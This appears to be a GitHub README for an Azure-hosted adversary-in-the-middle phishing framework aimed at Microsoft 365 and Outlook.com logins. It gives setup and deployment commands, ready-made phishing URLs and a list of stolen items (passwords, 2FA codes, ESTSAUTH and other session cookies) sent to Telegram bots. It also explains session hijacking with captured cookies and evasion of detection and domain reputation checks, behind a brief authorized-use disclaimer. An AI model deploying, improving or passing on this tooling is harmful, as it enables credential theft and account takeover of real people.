# Azure AiTM Phishing Framework 2025

An advanced Adversary-in-the-Middle (AiTM) phishing framework with enhanced credential capture, real-time Telegram notifications, and seamless Microsoft account support.

## 🚀 Features

### Core Capabilities
- **Service Worker-Based AiTM**: Leverages browser service workers for transparent proxying
- **Universal Microsoft Support**: Works with both corporate (Office 365) and personal (Outlook.com) accounts
- **Real-Time Telegram Notifications**: Instant alerts for captured credentials and auth cookies
- **Smart Cookie Filtering**: Only captures and reports critical authentication cookies
- **Full Credential Capture**: Email, password, and 2FA/OTC codes
- **Cookie Export Format**: Generates ready-to-use cookie injection scripts
- **Azure Web Apps Deployment**: Designed for PaaS deployment to avoid domain reputation issues

### Enhanced Features
- **Short URLs**: Convenient shortcuts (`/c` for corporate, `/p` for personal)
- **Session Persistence**: Maintains victim sessions across proxy restarts
- **Encrypted Logging**: AES-256-CTR encryption for all captured data
- **Anti-Detection**: Advanced header manipulation and client-side evasion
- **Automatic URL Rewriting**: Keeps victims on the proxy domain throughout their session

## 📋 Prerequisites

- Node.js 22.15.0 or higher (for zstd compression support)
- Azure subscription (for Azure Web Apps deployment)
- Telegram bot tokens (for notifications)

## 🛠️ Installation

```bash
git clone https://github.com/Billoxinogen18/AzureAiTMFunction-main.git
cd AzureAiTMFunction-main/clean-evilworker
```

## ⚙️ Configuration

### Telegram Bot Setup

Edit `proxy_server.js` and update the Telegram bot configurations:

```javascript
const TELEGRAM_BOT_TOKEN_1 = "YOUR_BOT_TOKEN_1";
const TELEGRAM_CHAT_ID_1 = "YOUR_CHAT_ID_1";
const TELEGRAM_BOT_TOKEN_2 = "YOUR_BOT_TOKEN_2";
const TELEGRAM_CHAT_ID_2 = "YOUR_CHAT_ID_2";
```

### Encryption Key

Modify the encryption key for production use:

```javascript
const ENCRYPTION_KEY = "YOUR-SECURE-32-CHARACTER-KEY-HERE";
```

## 🚀 Deployment

### Azure Web Apps (Recommended)

1. Create an Azure Web App (Node.js 22 LTS on Linux)
2. Deploy using Azure CLI:

```bash
zip -r deploy.zip . -x "*.git*" "node_modules/*" "phishing_logs/*"
az webapp deploy --resource-group YOUR_RG --name YOUR_APP_NAME --src-path deploy.zip --type zip
```

### Local Testing

```bash
node proxy_server.js
# Use ngrok or similar for HTTPS:
ngrok http 3000
```

## 🎯 Usage

### Short URLs

**Corporate Accounts:**
- `https://your-domain.azurewebsites.net/c`
- `https://your-domain.azurewebsites.net/corp`
- `https://your-domain.azurewebsites.net/corporate`

**Personal Accounts:**
- `https://your-domain.azurewebsites.net/p`
- `https://your-domain.azurewebsites.net/personal`

### Full Phishing URLs

Corporate:
```
https://your-domain.azurewebsites.net/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F
```

Personal:
```
https://your-domain.azurewebsites.net/login?method=signin&mode=secure&client_id=4765445b-32c6-49b0-83e6-1d93765276ca&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F
```

## 📱 Telegram Notifications

### Captured Data Includes:

1. **New Victim Sessions**
   - Target domain
   - Session cookie for hijacking
   - Timestamp and log file

2. **Login Credentials**
   - Email address
   - Full password
   - 2FA/OTC codes
   - MFA methods

3. **Critical Auth Cookies**
   - ESTSAUTH
   - ESTSAUTHPERSISTENT
   - ESTSAUTHLIGHT
   - SignInStateCookie
   - MSPAuth, PPAuth (personal accounts)

4. **Cookie Export Script**
   - Ready-to-inject JavaScript
   - All auth cookies in correct format
   - Auto-redirect to Microsoft login

## 🔒 Security Features

### Anti-Detection Mechanisms
- Removes proxy-identifying headers
- Spoofs legitimate browser fingerprints
- Client-side WebRTC blocking
- Canvas fingerprinting override
- Timezone and hardware spoofing

### Data Protection
- AES-256-CTR encryption for logs
- Secure session management
- No plaintext credential storage

## 📁 Log Decryption

Logs are stored encrypted in the `phishing_logs` directory:

```bash
node decrypt_log_file.js phishing_logs/YOUR_LOG_FILE.log
```

## ⚡ Advanced Features

### Session Hijacking
Use captured session cookies to access victim accounts:
1. Visit the proxy domain
2. Set the session cookie in browser DevTools
3. Access the victim's authenticated session

### Cookie Export Usage
The framework generates executable JavaScript that:
1. Sets all authentication cookies
2. Redirects to Microsoft login
3. Maintains the authenticated session

## ⚠️ Disclaimer

This framework is for authorized security testing and educational purposes only. Users are responsible for complying with all applicable laws and regulations. Unauthorized use is strictly prohibited.

## 🔧 Troubleshooting

### Common Issues

1. **502 Errors**: Check Azure logs, ensure Node.js 22 LTS is selected
2. **Redirect Loops**: Clear cookies and try again
3. **Personal Accounts Not Working**: This is a known Microsoft security limitation

### Debug Mode
Enable verbose logging by setting:
```javascript
const DEBUG = true;
```

## 📈 Updates & Improvements

- Enhanced credential capture with full passwords
- Smart cookie filtering (only important cookies)
- Cookie export format for easy session hijacking
- Short URLs for convenience
- Improved personal account support
- Real-time Telegram notifications

## 📞 Support

For authorized testing support and questions, please refer to the repository issues.

---

**Remember**: Always obtain proper authorization before testing. This tool is for legitimate security assessments only.
